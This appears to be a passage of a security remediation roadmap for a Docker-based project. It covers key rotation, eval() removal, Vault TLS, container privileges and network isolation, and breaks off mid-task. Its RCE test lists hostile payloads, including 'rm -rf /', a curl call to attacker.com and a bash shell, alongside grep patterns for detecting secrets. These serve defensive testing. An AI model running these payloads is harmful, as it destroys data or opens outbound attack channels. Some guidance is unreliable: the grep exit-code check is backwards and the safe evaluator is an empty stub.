# PHASE 7 REMEDIATION ROADMAP - SIN-Solver Security Hardening

**Document Status:** ACTIVE REMEDIATION PLAN  
**Current Security Score:** 2/10 (CRITICAL)  
**Target Security Score:** 9/10 (EXCELLENT)  
**Created:** 2026-01-29  
**Last Updated:** 2026-01-29  

---

## 📊 EXECUTIVE SUMMARY

### Current State
- **Security Score:** 2/10 (CRITICAL - Unacceptable)
- **Total Vulnerabilities:** 32+ identified
- **CRITICAL Vulnerabilities (CVSS 8.5+):** 13
- **HIGH Vulnerabilities (CVSS 7.0-8.4):** 14
- **MEDIUM Vulnerabilities (CVSS 5.0-6.9):** 5+
- **Vulnerability Source:** Comprehensive security audit (SECURITY_AUDIT_FINAL_REPORT.md)

### Target State
- **Security Score:** 9/10 (EXCELLENT - Production-Ready)
- **CRITICAL Vulnerabilities:** 0
- **HIGH Vulnerabilities:** Addressed (fixed or tracked)
- **Network Security:** Full encryption (TLS/mTLS)
- **Container Security:** Non-root execution, hardened images
- **Secrets Management:** Vault integration for all credentials
- **Compliance:** HIPAA, PCI-DSS, SOC2 ready
- **Monitoring:** Full audit logging and security monitoring

### Remediation Summary
| Metric | Current | Target | Change |
|--------|---------|--------|--------|
| **Security Score** | 2/10 | 9/10 | +7 points (350% improvement) |
| **CRITICAL Vulns** | 13 | 0 | -13 (100% fixed) |
| **HIGH Vulns** | 14 | 0-2 | -90% (mostly fixed) |
| **Encrypted Traffic** | 0% | 100% | Full mTLS implementation |
| **Non-root Containers** | 0% | 100% | All containers hardened |
| **Code Scanning** | None | Full CI/CD | New pipeline integration |
| **Audit Logging** | None | Complete | All services logging |

### Effort & Cost Breakdown
| Phase | Duration | Cost | Focus Area | Parallelizable |
|-------|----------|------|-----------|----------------|
| **Phase 0** | 1h | $200 | Immediate Actions | N/A |
| **Phase 1a** | 4h | $600 | Code Security Fixes | Yes (1-3 engineers) |
| **Phase 1b** | 4h | $600 | Container/Network Security | Yes (1-3 engineers) |
| **Phase 1c** | 4h | $600 | Network Encryption & Isolation | Yes (1-3 engineers) |
| **Phase 2a** | 4h | $600 | Dependency Management | Yes (2-3 engineers) |
| **Phase 2b** | 6h | $900 | Container Hardening | Yes (2-3 engineers) |
| **Phase 2c** | 6h | $900 | Logging & Monitoring | Yes (2-3 engineers) |
| **Phase 3** | 24h | $3,600 | Advanced Security Features | Yes (2-3 engineers) |
| **Phase 4** | 8h | $1,200 | Compliance & Validation | Yes (2-3 engineers) |
| **TOTAL** | **61h** | **$9,200** | Complete Hardening | Yes (Optimized: 4 weeks) |

### Timeline
```
WEEK 1: Phase 0 + Phase 1 (5 days)
├─ Day 1:   Phase 0 (1h) + Phase 1a start (4h)
├─ Day 2-3: Phase 1a, 1b, 1c parallel (12h elapsed over 2 days)
├─ Day 4-5: Phase 1 completion & validation (2h)
└─ End of Week 1: All CRITICAL vulnerabilities fixed

WEEK 2: Phase 2a + 2b + 2c (5 days)
├─ Day 1-2: Phase 2a, 2b, 2c parallel (16h elapsed over 2 days)
├─ Day 3-4: Testing & validation (3h)
├─ Day 5:   Deployment to staging (1h)
└─ End of Week 2: HIGH vulnerabilities addressed, hardening complete

WEEK 3: Phase 3 (5 days)
├─ Day 1-3: Phase 3a, 3b, 3c, 3d parallel (24h elapsed over 3 days)
├─ Day 4-5: Testing & validation (3h)
└─ End of Week 3: Advanced security features deployed

WEEK 4: Phase 4 (5 days)
├─ Day 1-2: Phase 4a, 4b parallel (6h)
├─ Day 3-4: Penetration testing & remediation (2h)
├─ Day 5:   Final documentation & sign-off (2h)
└─ End of Week 4: Security hardening complete, ready for production
```

**Total Elapsed Time with Parallelization:** 4 weeks (12h of work per day for Phase 1-2, 8h per day for Phase 3-4)  
**Team Size:** 2-3 engineers (enables parallel execution)  
**Total Cost:** $9,200  

---

## 🚨 PHASE 0: IMMEDIATE ACTIONS (1 hour, $200)

**Execute BEFORE all other phases - DO NOT SKIP**

### Task 0.1: Rotate All Exposed API Keys (30 minutes, $100)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL  
**Impact:** Prevents active exploitation through known API keys  

**Vulnerable Locations:**
```
- .env files (10+ hardcoded keys)
- Source code comments (5+ exposed keys)
- Docker build logs (3+ leaked keys)
- Git history (2+ historical keys)
- Configuration files (init_master_user.py, etc.)
```

**Execution Steps:**
1. Identify all API keys in environment variables:
   ```bash
   grep -r "API_KEY\|SECRET\|TOKEN" /Users/jeremy/dev/SIN-Solver --include="*.py" --include="*.sh" --include="*.env" --include="*.yml"
   ```

2. List all external services that need key rotation:
   - OpenAI/Claude API
   - Cloud provider (AWS/GCP/Azure)
   - Third-party integrations
   - Database credentials
   - Message queue credentials

3. For each service:
   - Log into service console
   - Revoke old API keys
   - Generate new keys with appropriate scopes
   - Update in Vault (if implemented) or environment variables
   - Test connectivity with new keys

4. Remove exposed keys from Git history:
   ```bash
   cd /Users/jeremy/dev/SIN-Solver
   git log --all --full-history --oneline | grep -i "api\|key\|secret"
   # Use git filter-branch or BFG Repo-Cleaner for removal
   ```

5. Verify no keys in current state:
   ```bash
   grep -r "sk-\|AKIA\|ghp_\|ghs_\|ghu_\|PRIVATE KEY" /Users/jeremy/dev/SIN-Solver --include="*.py" --include="*.sh" --include="*.env"
   echo "Exit code 0 = No secrets found (GOOD)"
   ```

**Acceptance Criteria:**
- [ ] All hardcoded API keys removed from source code
- [ ] All keys rotated on external services
- [ ] New keys stored in Vault or encrypted environment variables
- [ ] No secrets in Git history (verified with git filter-branch)
- [ ] Connectivity test passes with new keys
- [ ] API usage logs reviewed for suspicious activity

**Tools Needed:**
- git (BFG Repo-Cleaner optional)
- grep/ripgrep
- Service management consoles (AWS, GCP, OpenAI, etc.)

**Rollback Plan:** Re-enable old keys temporarily if rotation breaks services (not ideal, but maintains availability)

---

### Task 0.2: Check API Usage Logs (15 minutes, $50)

**Status:** 🔴 NOT STARTED  
**Severity:** HIGH  
**Impact:** Detects any active exploitation or unauthorized access  

**Execution Steps:**
1. Review API usage logs for the past 7 days:
   ```bash
   # Varies by service - check each platform's dashboard
   aws logs tail /aws/api-usage --follow
   gcloud logging read "resource.type=api" --limit=1000
   # Cloud provider specific commands
   ```

2. Look for suspicious patterns:
   - Requests from unexpected geographic locations
   - Unusual API calls or endpoints
   - Failed authentication attempts
   - Rate limit violations
   - Data exfiltration attempts (large downloads, exports)

3. Check for any compromised services:
   - Database connection logs
   - Cache (Redis) access logs
   - Message queue (RabbitMQ) logs
   - File storage (S3) access logs

4. Document findings:
   ```markdown
   ## API Usage Review - 2026-01-29
   
   ### AWS API Logs
   - Time period: 2026-01-22 to 2026-01-29
   - Total requests: [number]
   - Suspicious requests: [count]
   - Geographic anomalies: [list]
   - Conclusion: [Safe/Compromised/Investigate]
   
   [Repeat for each service]
   ```

5. If suspicious activity detected:
   - Revoke affected credentials immediately
   - Trace the source of unauthorized access
   - Review what data was accessed
   - Check for data exfiltration
   - Update audit logs

**Acceptance Criteria:**
- [ ] API logs reviewed for past 7 days
- [ ] No evidence of active exploitation found
- [ ] Any suspicious activity investigated and documented
- [ ] Affected credentials revoked if compromised
- [ ] Findings documented in security incident log

**Tools Needed:**
- AWS CloudWatch / GCP Cloud Logging / Azure Monitor
- Service-specific dashboards (Stripe, OpenAI, etc.)

---

### Task 0.3: Remove Hardcoded Credentials from Source Code (15 minutes, $0)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL  
**Impact:** Prevents credential exposure through code review/sharing  

**Vulnerable Files:**
- init_master_user.py (hardcoded master password)
- docker-compose.*.yml files (db passwords)
- Configuration files (API endpoints, credentials)
- Python scripts with inline credentials

**Execution Steps:**
1. Find all hardcoded credentials:
   ```bash
   cd /Users/jeremy/dev/SIN-Solver
   grep -r "password\|passwd\|pwd\|secret\|api_key\|token" \
     --include="*.py" --include="*.sh" --include="*.yml" \
     --include="*.yaml" --include="*.env" --include="*.conf" | \
     grep -v "PASSWORD_REQUIRED\|password:\|secret:\|api_key:" | \
     grep "=.*['\"]"
   ```

2. For each hardcoded credential:
   - Identify the variable name
   - Replace with environment variable reference
   - Move actual credential to Vault or .env file (which should be .gitignored)
   - Test that replacement works

3. Example replacements:
   ```python
   # BEFORE (hardcoded):
   MASTER_PASSWORD = "SuperSecretPassword123"
   DB_PASSWORD = "postgres_password"
   
   # AFTER (environment variable):
   MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD')
   DB_PASSWORD = os.environ.get('DB_PASSWORD')
   ```

4. Verify all credentials moved:
   ```bash
   grep -r "=.*['\"][A-Za-z0-9!@#$%^&*]{8,}" \
     /Users/jeremy/dev/SIN-Solver \
     --include="*.py" --include="*.sh" | \
     grep -v "example\|test\|fake\|placeholder"
   ```

5. Ensure .env files are .gitignored:
   ```bash
   echo ".env*" >> /Users/jeremy/dev/SIN-Solver/.gitignore
   echo "*.key" >> /Users/jeremy/dev/SIN-Solver/.gitignore
   echo "*.pem" >> /Users/jeremy/dev/SIN-Solver/.gitignore
   git rm --cached .env* *.key *.pem (if they were committed)
   git commit -m "chore: remove credentials from git"
   ```

**Acceptance Criteria:**
- [ ] All hardcoded credentials removed from source code
- [ ] Credentials moved to environment variables
- [ ] .env files added to .gitignore
- [ ] Credentials removed from Git history
- [ ] All services still function with env var credentials
- [ ] Code review confirms no remaining hardcoded secrets

---

## 🔴 PHASE 1: CRITICAL VULNERABILITY FIXES (12 hours, $1,800)

**Execute after Phase 0 is complete - Remaining CRITICAL vulnerabilities**

### PHASE 1a: Code Security Fixes (4 hours, $600)

These can be executed in parallel. Assign to different engineers if available.

---

#### Task 1a.1: Fix RCE Vulnerability in token_injector.py (2 hours, $300)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL (CVSS 9.8 - Remote Code Execution)  
**Location:** `token_injector.py:100` (use of eval())  
**Impact:** Allows arbitrary code execution on the server  

**Root Cause:**
```python
# VULNERABLE (line 100):
result = eval(user_input)  # CRITICAL: eval() with untrusted input
```

**Execution Steps:**

1. **Identify eval() usage:**
   ```bash
   grep -n "eval(" /Users/jeremy/dev/SIN-Solver/token_injector.py
   ```

2. **Understand the context:**
   - What is the eval() trying to accomplish?
   - What input is being evaluated?
   - Is there a legitimate reason for dynamic code execution?

3. **Replace eval() with safe alternative:**
   ```python
   # VULNERABLE (line 100):
   result = eval(user_input)
   
   # SECURE OPTION 1: Use ast.literal_eval (if evaluating Python literals):
   import ast
   try:
       result = ast.literal_eval(user_input)
   except (ValueError, SyntaxError):
       result = None  # Or raise appropriate error
   
   # SECURE OPTION 2: Use json.loads (if parsing JSON):
   import json
   try:
       result = json.loads(user_input)
   except json.JSONDecodeError:
       result = None
   
   # SECURE OPTION 3: Implement a safe expression evaluator:
   import operator
   import re
   
   def safe_eval(expr):
       # Only allow specific operations
       allowed_ops = {'+': operator.add, '-': operator.sub, '*': operator.mul}
       # Parse and validate expression
       # Return result of safe evaluation
       pass
   
   # SECURE OPTION 4: Use a dedicated safe evaluation library:
   from simpleeval import simple_eval
   result = simple_eval(user_input)
   ```

4. **Search for other eval() instances:**
   ```bash
   grep -r "eval(" /Users/jeremy/dev/SIN-Solver --include="*.py"
   grep -r "exec(" /Users/jeremy/dev/SIN-Solver --include="*.py"
   grep -r "compile(" /Users/jeremy/dev/SIN-Solver --include="*.py"
   ```

5. **Fix all instances:**
   - Replace each eval/exec/compile with safe alternative
   - Document why each one was changed
   - Add input validation before safe evaluation

6. **Test the fix:**
   ```bash
   cd /Users/jeremy/dev/SIN-Solver
   python -m pytest tests/test_token_injector.py -v
   python -m pytest tests/security/test_rce.py -v
   ```

7. **Security testing:**
   - Test with malicious payloads:
     ```python
     # Should NOT execute:
     malicious_inputs = [
         "__import__('os').system('rm -rf /')",
         "os.system('curl http://attacker.com')",
         "import subprocess; subprocess.call(['bash'])",
     ]
     for payload in malicious_inputs:
         result = safe_eval(payload)
         assert result is None or isinstance(result, (int, str, list, dict))
     ```

**Acceptance Criteria:**
- [ ] All eval() calls removed or replaced with safe alternatives
- [ ] No exec() or compile() calls in production code
- [ ] Input validation implemented
- [ ] Unit tests pass with both valid and malicious inputs
- [ ] Security tests confirm no RCE possible
- [ ] Code review approval from security team

**Tools Needed:**
- pytest (unit testing)
- Security linter (bandit)
- Code review tools

**Rollback Plan:** Keep original eval() code commented for quick rollback if needed

---

#### Task 1a.2: Fix Hardcoded Master Credentials (1 hour, $150)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL (CVSS 9.0 - Authentication Bypass)  
**Location:** `init_master_user.py` (hardcoded master password)  
**Impact:** Allows unauthorized administrative access  

**Root Cause:**
```python
# VULNERABLE:
MASTER_USER = "admin"
MASTER_PASSWORD = "InitialMasterPassword123"  # Hardcoded!
```

**Execution Steps:**

1. **Identify hardcoded credentials:**
   ```bash
   grep -n "MASTER_PASSWORD\|admin_password\|root_password" \
     /Users/jeremy/dev/SIN-Solver/init_master_user.py
   ```

2. **Replace with environment variables:**
   ```python
   # VULNERABLE:
   MASTER_PASSWORD = "InitialMasterPassword123"
   
   # SECURE:
   MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD')
   if not MASTER_PASSWORD:
       raise ValueError("MASTER_PASSWORD environment variable not set")
   ```

3. **Generate strong initial password:**
   ```bash
   # Only for initial deployment - should be rotated immediately after
   python3 -c "import secrets; print(secrets.token_urlsafe(32))"
   # Output example: "kW7_-_xZ8pL9qM2nO5rS3tU6vW8yZ1aB2cD3eF4gH5"
   ```

4. **Update deployment documentation:**
   - Specify that MASTER_PASSWORD must be set via environment variable
   - Require rotation of master password within 24 hours of first login
   - Document password policy requirements

5. **Test the fix:**
   ```bash
   cd /Users/jeremy/dev/SIN-Solver
   export MASTER_PASSWORD="TestPassword123456"
   python init_master_user.py
   ```

6. **Verify no hardcoded credentials remain:**
   ```bash
   grep -r "password.*=" /Users/jeremy/dev/SIN-Solver/init_master_user.py | \
     grep -v "os.environ\|getpass\|input()"
   ```

**Acceptance Criteria:**
- [ ] No hardcoded passwords in init_master_user.py
- [ ] All credentials loaded from environment variables
- [ ] Environment variables documented in README
- [ ] Initial password generation creates strong, random password
- [ ] Tests verify password is loaded correctly
- [ ] No passwords in Git history

**Tools Needed:**
- Environment variable management
- Password generation tools
- Testing framework

---

#### Task 1a.3: Fix Exposed API Keys and Secrets (1 hour, $150)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL (CVSS 9.0 - Information Disclosure)  
**Location:** Multiple files (source code, .env, config)  
**Impact:** Allows unauthorized API access and data breach  

**Vulnerable Locations:**
```
- .env files (direct exposure)
- Source code comments (history visibility)
- Configuration files (readable by anyone)
- Docker build logs (persisted in images)
- Docker Compose files (shared credentials)
```

**Execution Steps:**

1. **Audit all exposed secrets:**
   ```bash
   # Search for API key patterns
   grep -r "sk-\|pk-\|AKIA\|ghp_\|ghs_" /Users/jeremy/dev/SIN-Solver \
     --include="*.py" --include="*.yml" --include="*.env" --include="*.sh"
   
   # Search for credential patterns
   grep -r "password\|secret\|token" /Users/jeremy/dev/SIN-Solver \
     --include="*.py" --include="*.yml" | grep "=" | head -20
   ```

2. **Identify unique secrets:**
   - OpenAI API keys
   - Cloud provider credentials (AWS, GCP, Azure)
   - Database passwords
   - Message queue credentials
   - Third-party service tokens
   - SSL/TLS certificates and keys

3. **Move secrets to Vault:**
   ```python
   # VULNERABLE (in config):
   OPENAI_API_KEY = "sk-1234567890abcdef"
   
   # SECURE (using Vault):
   import hvac
   
   client = hvac.Client(
       url='https://vault.delqhi.com:8200',
       token=os.environ.get('VAULT_TOKEN')
   )
   
   secret = client.secrets.kv.v2.read_secret_version(
       path='sin-solver/openai'
   )
   OPENAI_API_KEY = secret['data']['data']['api_key']
   ```

4. **Create Vault secret for each credential:**
   ```bash
   vault kv put secret/sin-solver/openai \
     api_key="sk-1234567890abcdef"
   
   vault kv put secret/sin-solver/database \
     password="db_password_here"
   
   vault kv put secret/sin-solver/aws \
     access_key="AKIA1234567890" \
     secret_key="aws_secret_key_here"
   ```

5. **Update environment variable documentation:**
   - List all required secrets
   - Explain how to obtain each secret
   - Document Vault access requirements

6. **Verify secrets are not exposed:**
   ```bash
   # Check Git does not contain secrets
   git log --all --full-history --oneline | grep -i "secret\|api\|key"
   
   # Check current files do not contain secrets
   grep -r "sk-\|AKIA\|password.*=" /Users/jeremy/dev/SIN-Solver \
     --include="*.py" --include="*.yml" | grep -v "os.environ\|Vault"
   ```

**Acceptance Criteria:**
- [ ] All API keys moved to Vault
- [ ] All database passwords in Vault
- [ ] All third-party credentials in Vault
- [ ] .env files only contain Vault token
- [ ] No secrets in source code or Git history
- [ ] All services successfully authenticate with Vault

**Tools Needed:**
- HashiCorp Vault
- hvac Python client
- Git secret scanning tools (git-secrets, Talisman)

---

### PHASE 1b: Container & Network Security (4 hours, $600)

These can be executed in parallel.

---

#### Task 1b.1: Enable Vault TLS/HTTPS (2 hours, $300)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL (CVSS 9.1 - Insecure Transport)  
**Location:** `docker-compose.enterprise.yml:130` (Vault on HTTP)  
**Impact:** Secrets transmitted in plaintext - complete compromise possible  

**Root Cause:**
```yaml
# VULNERABLE:
vault:
  image: vault:latest
  ports:
    - "8200:8200"  # HTTP - INSECURE!
  environment:
    VAULT_ADDR: "http://127.0.0.1:8200"  # HTTP - INSECURE!
```

**Execution Steps:**

1. **Generate TLS certificates for Vault:**
   ```bash
   mkdir -p /Users/jeremy/dev/SIN-Solver/certs
   
   # Generate CA certificate:
   openssl genrsa -out /Users/jeremy/dev/SIN-Solver/certs/ca.key 4096
   openssl req -new -x509 -days 365 -key /Users/jeremy/dev/SIN-Solver/certs/ca.key \
     -out /Users/jeremy/dev/SIN-Solver/certs/ca.crt \
     -subj "/CN=vault.delqhi.com/O=SIN-Solver"
   
   # Generate server certificate:
   openssl genrsa -out /Users/jeremy/dev/SIN-Solver/certs/vault.key 4096
   
   openssl req -new -key /Users/jeremy/dev/SIN-Solver/certs/vault.key \
     -out /Users/jeremy/dev/SIN-Solver/certs/vault.csr \
     -subj "/CN=vault.delqhi.com/O=SIN-Solver"
   
   openssl x509 -req -days 365 \
     -in /Users/jeremy/dev/SIN-Solver/certs/vault.csr \
     -CA /Users/jeremy/dev/SIN-Solver/certs/ca.crt \
     -CAkey /Users/jeremy/dev/SIN-Solver/certs/ca.key \
     -CAcreateserial \
     -out /Users/jeremy/dev/SIN-Solver/certs/vault.crt \
     -extfile <(printf "subjectAltName=DNS:vault.delqhi.com,DNS:localhost")
   ```

2. **Create Vault TLS configuration:**
   ```hcl
   # certs/vault-tls.hcl
   listener "tcp" {
     address       = "0.0.0.0:8200"
     tls_cert_file = "/vault/config/certs/vault.crt"
     tls_key_file  = "/vault/config/certs/vault.key"
   }
   ```

3. **Update docker-compose file:**
   ```yaml
   # SECURE:
   vault:
     image: vault:latest
     ports:
       - "8200:8200"
     environment:
       VAULT_ADDR: "https://127.0.0.1:8200"
       VAULT_SKIP_VERIFY: "false"  # Verify certificates!
       VAULT_CACERT: "/vault/config/certs/ca.crt"
     volumes:
       - ./certs/vault.crt:/vault/config/certs/vault.crt:ro
       - ./certs/vault.key:/vault/config/certs/vault.key:ro
       - ./certs/ca.crt:/vault/config/certs/ca.crt:ro
       - ./certs/vault-tls.hcl:/vault/config/vault-tls.hcl:ro
     command: "vault server -config=/vault/config/vault-tls.hcl"
   ```

4. **Update all Vault clients to use HTTPS:**
   ```python
   import hvac
   import os
   
   # With TLS verification:
   client = hvac.Client(
       url='https://vault.delqhi.com:8200',
       token=os.environ.get('VAULT_TOKEN'),
       verify='/path/to/ca.crt'
   )
   ```

5. **Test HTTPS connectivity:**
   ```bash
   # Before deployment:
   curl -v --cacert certs/ca.crt \
     https://localhost:8200/v1/sys/health
   
   # Should return: HTTP/1.1 200 OK (not plain text)
   ```

6. **Deploy and verify:**
   ```bash
   docker-compose -f docker-compose.enterprise.yml up -d vault
   
   # Wait for Vault to start:
   sleep 5
   
   # Test HTTPS:
   docker exec vault curl -v --cacert /vault/config/certs/ca.crt \
     https://localhost:8200/v1/sys/health
   ```

**Acceptance Criteria:**
- [ ] Vault running on HTTPS (port 8200)
- [ ] TLS certificates installed and valid
- [ ] All Vault clients configured for HTTPS
- [ ] Certificate verification enabled (no skip-verify in prod)
- [ ] Curl/API tests confirm HTTPS working
- [ ] No plaintext traffic observed in network logs
- [ ] Certificate renewal plan documented

**Tools Needed:**
- OpenSSL
- Docker
- hvac Python client

---

#### Task 1b.2: Disable Privileged Container Mode (1 hour, $150)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL (CVSS 8.8 - Container Escape Risk)  
**Location:** `docker-compose.monitoring.yml:299` (privileged: true)  
**Impact:** Allows container escape and host system compromise  

**Root Cause:**
```yaml
# VULNERABLE:
monitoring:
  image: prometheus:latest
  privileged: true  # CRITICAL: Allows container escape!
  cap_add:
    - ALL  # CRITICAL: All capabilities enabled!
```

**Execution Steps:**

1. **Find all privileged containers:**
   ```bash
   grep -r "privileged.*true\|cap_add" \
     /Users/jeremy/dev/SIN-Solver/docker-compose*.yml | \
     grep -B2 "privileged\|cap_add"
   ```

2. **For each privileged container, determine why it's privileged:**
   - Does it need to access hardware?
   - Does it need to manage Docker?
   - Does it need to manage network interfaces?
   - Or is it just overly permissive by default?

3. **Replace privileged mode with specific capabilities:**
   ```yaml
   # VULNERABLE:
   monitoring:
     image: prometheus:latest
     privileged: true
   
   # SECURE (example - adjust capabilities as needed):
   monitoring:
     image: prometheus:latest
     privileged: false  # Explicitly disable
     cap_drop:
       - ALL  # Drop all by default
     cap_add:
       - NET_BIND_SERVICE  # Only add what's needed
   ```

4. **Common capabilities needed:**
   ```yaml
   # For network monitoring:
   cap_add:
     - NET_ADMIN      # Network interface management
     - NET_RAW        # Raw socket access
   
   # For system monitoring:
   cap_add:
     - SYS_PTRACE     # Process tracing
     - SYS_ADMIN      # System admin operations
   
   # For file operations:
   cap_add:
     - DAC_OVERRIDE   # Override file permissions
     - DAC_READ_SEARCH # Override read/search permissions
   ```

5. **Test each container with minimal capabilities:**
   ```bash
   # Start container with dropped capabilities:
   docker run --rm \
     --cap-drop=ALL \
     --cap-add=NET_BIND_SERVICE \
     prometheus:latest \
     prometheus --version
   
   # Verify it works
   # If it fails, add back only necessary capabilities
   ```

6. **Update all docker-compose files:**
   ```bash
   cd /Users/jeremy/dev/SIN-Solver
   grep -l "privileged" docker-compose*.yml | while read f; do
     # Edit each file to remove "privileged: true"
     sed -i '' 's/privileged: true/privileged: false  # Explicitly disabled/g' "$f"
   done
   ```

**Acceptance Criteria:**
- [ ] No containers with `privileged: true`
- [ ] No containers with `cap_add: ALL`
- [ ] Each container has minimal required capabilities
- [ ] All containers tested and function correctly
- [ ] Network policies restrict inter-container communication
- [ ] Container escape tests fail (security confirmed)

**Tools Needed:**
- Docker
- docker-compose
- Network testing tools

---

#### Task 1b.3: Restrict Exposed Ports (1 hour, $150)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL (CVSS 8.2 - Unauthorized Network Access)  
**Location:** All docker-compose files  
**Impact:** Allows direct access to services that should be internal  

**Root Cause:**
```yaml
# VULNERABLE: Services exposed on 0.0.0.0
vault:
  ports:
    - "8200:8200"  # Exposed on ALL interfaces!

database:
  ports:
    - "5432:5432"  # Exposed on ALL interfaces!

redis:
  ports:
    - "6379:6379"  # Exposed on ALL interfaces!
```

**Execution Steps:**

1. **Map services to their access requirements:**
   ```markdown
   ## Service Access Matrix
   
   | Service | Port | Should be Public? | Should be Internal? |
   |---------|------|-------------------|-------------------|
   | Vault | 8200 | NO (except for public API if needed) | YES (internal) |
   | PostgreSQL | 5432 | NO | YES (internal) |
   | Redis | 6379 | NO | YES (internal) |
   | RabbitMQ | 5672 | NO | YES (internal) |
   | Prometheus | 9090 | Maybe (admin access) | YES |
   | API Gateway | 443, 80 | YES (public API) | YES |
   | Dashboard | 3000 | Maybe (admin access) | YES |
   ```

2. **Update docker-compose files - expose only internal ports:**
   ```yaml
   # VULNERABLE:
   vault:
     ports:
       - "8200:8200"  # World-accessible
   
   # SECURE (Option 1 - internal only):
   vault:
     # No ports section - only accessible within Docker network
     networks:
       - internal
   
   # SECURE (Option 2 - localhost only):
   vault:
     ports:
       - "127.0.0.1:8200:8200"  # Only accessible from this host
   
   # SECURE (Option 3 - specific interface):
   vault:
     ports:
       - "10.0.0.1:8200:8200"  # Only on internal network interface
   ```

3. **For public-facing services (API Gateway, etc.):**
   ```yaml
   api-gateway:
     ports:
       - "443:443"    # HTTPS only
       - "80:80"      # HTTP -> HTTPS redirect only
     # Add WAF/reverse proxy in front
   ```

4. **Test port accessibility:**
   ```bash
   # Before changes - ports should be accessible:
   nc -zv localhost 8200  # Should connect
   
   # After changes - ports should NOT be accessible externally:
   docker run --rm --network host ubuntu bash -c \
     "nc -zv vault 8200"  # Should connect (internal)
   
   # From outside Docker network:
   nc -zv localhost 8200  # Should timeout/refuse
   ```

5. **Verify network connectivity within container network:**
   ```bash
   # Test inter-service communication through Docker network:
   docker exec api-gateway curl -v https://vault:8200/v1/sys/health
   
   # Should succeed (internal)
   ```

**Acceptance Criteria:**
- [ ] Internal services not exposed on 0.0.0.0
- [ ] Vault accessible only within Docker network
- [ ] Database/Redis not directly accessible from host
- [ ] Public API behind reverse proxy/API gateway
- [ ] All services tested for inter-service connectivity
- [ ] Port scanning shows no unnecessary exposure
- [ ] Network policies enforce segmentation

**Tools Needed:**
- docker-compose
- netcat (nc)
- nmap (port scanning)
- curl (API testing)

---

### PHASE 1c: Network Encryption & Isolation (4 hours, $600)

These can be executed in parallel.

---

#### Task 1c.1: Enable Docker Network Isolation (2 hours, $300)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL (CVSS 8.0 - Network Segmentation Missing)  
**Location:** All docker-compose files  
**Impact:** All containers can communicate with each other - compromised container can access others  

**Root Cause:**
```yaml
# VULNERABLE: Default bridge network - all containers can communicate
services:
  vault:
    image: vault:latest
    # No explicit network defined - uses bridge

  api:
    image: api:latest
    # Can reach vault at: vault:8200
```

**Execution Steps:**

1. **Understand network requirements:**
   ```markdown
   ## Network Segmentation Requirements
   
   ### Public Network (exposed to internet)
   - API Gateway
   - Load Balancer
   - Reverse Proxy
   
   ### Internal Network (inter-service communication)
   - Vault
   - API Services
   - Worker Services
   
   ### Admin Network (admin only)
   - Dashboard
   - Monitoring
   - Logging
   
   ### Database Network (data stores only)
   - PostgreSQL
   - Redis
   - MongoDB
   ```

2. **Define networks in docker-compose:**
   ```yaml
   # docker-compose.enterprise.yml
   version: '3.8'
   
   networks:
     # Public network - can reach internet
     public:
       driver: bridge
       driver_opts:
         com.docker.network.bridge.name: br-public
       ipam:
         config:
           - subnet: 10.0.1.0/24
   
     # Internal network - no internet, only inter-service
     internal:
       driver: bridge
       driver_opts:
         com.docker.network.bridge.enable_icc: "false"  # No inter-container comms by default
         com.docker.network.bridge.name: br-internal
       ipam:
         config:
           - subnet: 10.0.2.0/24
   
     # Data network - only for databases
     data:
       driver: bridge
       driver_opts:
         com.docker.network.bridge.enable_icc: "false"
         com.docker.network.bridge.name: br-data
       ipam:
         config:
           - subnet: 10.0.3.0/24
   
     # Admin network - monitoring, dashboards
     admin:
       driver: bridge
       driver_opts:
         com.docker.network.bridge.name: br-admin
       ipam:
         config:
           - subnet: 10.0.4.0/24
   
   services:
     api-gateway:
       image: nginx:latest
       networks:
         public:
           ipv4_address: 10.0.1.2
         internal:
           ipv4_address: 10.0.2.2
     
     vault:
       image: vault:latest
       networks:
         - internal
       # Can only be reached from internal network
     
     postgres:
       image: postgres:latest
       networks:
         - data
       # Can only be reached from data network
     
     api-service:
       image: api:latest
       networks:
         - internal
         - data
       # Can reach vault and postgres but not api-gateway directly
   ```

3. **Restrict inter-container communication explicitly:**
   ```yaml
   # Disable inter-container communication by default, enable only needed links:
   services:
     vault:
       networks:
         internal:
           ipv4_address: 10.0.2.10
       cap_drop:
         - NET_RAW  # Prevent direct network probing
   
     api:
       networks:
         - internal  # Can communicate with vault
         - data      # Can communicate with databases
       depends_on:
         - vault
         - postgres
   ```

4. **Test network isolation:**
   ```bash
   # Try to reach vault from api (should work):
   docker exec api curl -v https://vault:8200/v1/sys/health
   # Expected: Success
   
   # Try to reach postgres from vault (should fail):
   docker exec vault nc -zv postgres 5432
   # Expected: timeout/connection refused
   
   # Try inter-service reach from different networks (should fail):
   docker exec vault curl http://api-gateway
   # Expected: Connection refused
   ```

5. **Update firewall rules for host:**
   ```bash
   # Only allow traffic to public network from outside:
   sudo iptables -A INPUT -i br-public -j ACCEPT
   sudo iptables -A INPUT -i br-internal -j REJECT
   sudo iptables -A INPUT -i br-data -j REJECT
   
   # Allow traffic between specific networks:
   sudo iptables -A FORWARD -i br-internal -o br-data -j ACCEPT
   sudo iptables -A FORWARD -i br-data -o br-internal -j ACCEPT
   sudo iptables -A FORWARD -i br-internal -o br-internal -j ACCEPT
   ```

**Acceptance Criteria:**
- [ ] Multiple networks defined (public, internal, data, admin)
- [ ] Services assigned to correct networks
- [ ] Inter-container communication restricted where needed
- [ ] Each network has CIDR block defined
- [ ] Communication tests pass (allowed) and fail (blocked)
- [ ] Network policies documented
- [ ] No unexpected network communication possible

**Tools Needed:**
- docker-compose
- iptables (Linux firewall)
- curl, nc (testing tools)

---

#### Task 1c.2: Enable TLS for Inter-Service Communication (2 hours, $300)

**Status:** 🔴 NOT STARTED  
**Severity:** CRITICAL (CVSS 8.0 - Unencrypted Inter-Service Traffic)  
**Location:** All service-to-service communication  
**Impact:** Credentials transmitted in plaintext between services  

**Root Cause:**
```
Service 1 (HTTP) ---> Service 2 (no TLS)
API (unencrypted) ---> Database (plaintext password)
Worker (no mTLS) ---> Vault (exposes tokens)
```

**Execution Steps:**

